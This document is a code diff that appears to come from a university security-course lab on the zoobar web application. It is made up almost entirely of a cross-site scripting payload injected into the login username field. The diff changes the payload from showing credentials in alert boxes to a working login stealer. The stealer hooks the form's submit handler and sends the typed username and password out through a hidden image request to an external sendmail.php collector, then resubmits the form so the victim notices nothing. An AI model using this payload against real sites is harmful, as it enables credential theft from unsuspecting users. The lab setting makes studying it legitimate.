@@ -26,20 +26,32 @@
 				
 		
 				
-				post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];alert(loginusername.value);alert(loginpassword.value);};", loginpassword:"meh" , submitlogin:"Log+in"});
+				post('http://zoobar.csl.toronto.edu/index.php', {loginusername: "'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){if(picLoad==1){return(1==1);}loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];image=document.createElement('img');image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();image.hidden=true;image.onload=function(){picLoad=1;document.getElementsByName('login_form')[0].submit();};document.body.appendChild(image);return(1!=1);};", loginpassword:"" , submitlogin:"Log+in"});
 				
 				/*
+				
+'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){if(picLoad==1){return(1==1);}loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];image=document.createElement('img');image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();image.hidden=true;image.onload=function(){picLoad=1;document.getElementsByName('login_form')[0].submit();};document.body.appendChild(image);return(1!=1);};
+
 					'' onFocus=
 					document.getElementsByClassName('warning')[0].innerHTML='';
 					document.getElementsByName('login_form')[0].onsubmit=function(){
+						if(picLoad==1){return(1==1);}
 						loginusername=document.getElementsByName('loginusername')[0];
 						loginpassword=document.getElementsByName('loginpassword')[0];
-						alert(loginusername.value);
-						alert(loginpassword.value);
+						image=document.createElement('img');
+						image.src='http://ece568.csl.toronto.edu/a3/sendmail.php?to=lehoangm&netid=lehoangm_lab3_partC&payload='+encodeURI(loginusername.value)+','+encodeURI(loginpassword.value)+'&random='+Math.random();
+						image.hidden=true;
+						image.onload=function(){
+							picLoad=1;
+							document.getElementsByName('login_form')[0].submit();
+						};
+						document.body.appendChild(image);
+						return(1!=1);
 					};
 				*/
 		</script>
 	</body>
 </html>
 
-'' onFocus=document.getElementsByClassName('warning')[0].innerHTML='';document.getElementsByName('login_form')[0].onsubmit=function(){loginusername=document.getElementsByName('loginusername')[0];loginpassword=document.getElementsByName('loginpassword')[0];alert(loginusername.value);alert(loginpassword.value);};
+
+
